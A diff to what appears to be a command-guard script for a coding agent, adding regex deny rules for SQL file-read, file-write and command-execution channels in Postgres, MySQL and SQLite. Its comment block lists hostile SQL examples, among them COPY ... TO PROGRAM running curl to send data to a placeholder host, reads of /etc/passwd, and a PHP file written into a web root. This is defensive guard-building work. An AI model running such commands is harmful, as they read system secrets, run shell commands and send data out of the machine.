@@ -498,6 +498,53 @@ DB_PATTERNS=(
 )
 DELETE_NOWHERE='DELETE([[:space:]]|/\*[^/]*\*/)+FROM([[:space:]]|/\*[^/]*\*/)+["`a-zA-Z_]([a-zA-Z0-9_"`.]*[a-zA-Z0-9_"`])?[[:space:]]*(;|"|'\''|`|\||&|\)|$)'
 DB_PATTERNS+=("$DELETE_NOWHERE")
+
+# v4.0.46: SQL as a FILE and EXEC channel, not only a destructive-DDL one.
+# Everything above guards the destructive axis — DROP, TRUNCATE, DELETE, ORM
+# resets. Measured against the whole chain with working controls (`psql -c
+# "DROP TABLE users"` denied, `echo hello` allowed), SEVEN file-access forms were
+# allowed, and one of them is arbitrary command execution:
+#
+#   COPY t TO PROGRAM 'curl http://x/ -d @-'   ALLOWED  <- RCE + exfil
+#   COPY t FROM '/etc/passwd'                  ALLOWED
+#   SELECT pg_read_file('/etc/passwd')         ALLOWED
+#   SELECT LOAD_FILE('/etc/passwd')            ALLOWED
+#   SELECT x INTO OUTFILE '/var/www/s.php'     ALLOWED
+#   ATTACH DATABASE '/etc/passwd' AS leak      ALLOWED
+#   SELECT writefile('/tmp/x','data')          ALLOWED
+#
+# A whole capability class, the same shape as the Grep/Glob channel gap: the
+# database client is a general-purpose file reader and writer, and on Postgres a
+# shell. Noticed while auditing nikhilsingla7/dynamic-report-agent, whose own
+# guard is a six-line keyword blocklist — the gap its list could not express is
+# the one we also had.
+#
+# `COPY ... TO PROGRAM` is the sharpest: it runs a shell command as the database
+# user, so it is both execution and an egress path that no curl/wget rule sees,
+# because the command sits inside a quoted SQL string.
+DB_PATTERNS+=(
+  # Postgres server-side execution. `TO PROGRAM` / `FROM PROGRAM` both exist.
+  'COPY[[:space:]][^;|&]*[[:space:]](TO|FROM)[[:space:]]+PROGRAM[[:space:]]'
+  # Postgres server-side file read/write. `\copy` (client-side, ordinary work) is
+  # NOT matched: the backslash form is a psql meta-command, and the anchor here
+  # requires COPY at a word boundary followed by an identifier, not a backslash.
+  'COPY[[:space:]][^;|&]*[[:space:]](TO|FROM)[[:space:]]+'\''/'
+  '(pg_read_file|pg_read_binary_file|pg_ls_dir|pg_stat_file)[[:space:]]*\('
+  # MySQL file read / write.
+  'LOAD_FILE[[:space:]]*\('
+  'INTO[[:space:]]+(OUT|DUMP)FILE[[:space:]]'
+  # SQLite fileio extension: arbitrary read and write.
+  '(readfile|writefile)[[:space:]]*\('
+  # SQLite ATTACH opens a file as a database, which reads it. Attaching another
+  # database is ordinary work — `ATTACH DATABASE '/data/archive.sqlite'` must
+  # keep passing, and it did NOT under the first version of this rule (measured;
+  # it was this rule's one false positive). POSIX ERE has no lookahead, so
+  # "any path that is not a database" cannot be written directly. Anchor on
+  # WHERE the attack points instead: system directories and dot-directories.
+  # Documented residual: `ATTACH '/data/passwords.txt'` is not caught. Narrower
+  # and honest beats broad and switched off.
+  'ATTACH([[:space:]]|/\*[^/]*\*/)+(DATABASE([[:space:]]|/\*[^/]*\*/)+)?["'\''`]?(/(etc|proc|sys|root|boot|dev)/|[^"'\''`[:space:]]*/\.[a-zA-Z])'
+)
 DESTRUCT_PATTERNS=(
   # v2.29.31: deleting the .git directory destroys every commit, branch, stash and
   # reflog at once -- strictly worse than any single command already blocked here,
